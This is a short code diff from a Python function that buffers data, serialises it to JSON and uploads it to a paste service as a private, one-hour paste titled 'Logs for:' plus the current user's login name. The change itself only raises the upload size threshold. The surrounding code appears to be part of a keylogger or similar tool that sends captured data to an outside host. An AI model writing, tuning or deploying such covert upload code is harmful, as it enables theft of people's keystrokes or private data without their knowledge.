@@ -64,7 +64,7 @@ def fill_buffer_upload(myInode, uploadInterval):
         print(bufferToUp)
         print("DEBUGGING SIZE: {} \n".format(sys.getsizeof(bufferToUp)))
         print(">>>>".format(api))
-        if(sys.getsizeof(bufferToUp)>200):
+        if(sys.getsizeof(bufferToUp)>600):
             data = json.dumps(bufferToUp)
             result = api.paste(data, guest=False, name="Logs for: {}".format(getpass.getuser()), format='json', private='2', expire='1H')
             sleep(2)
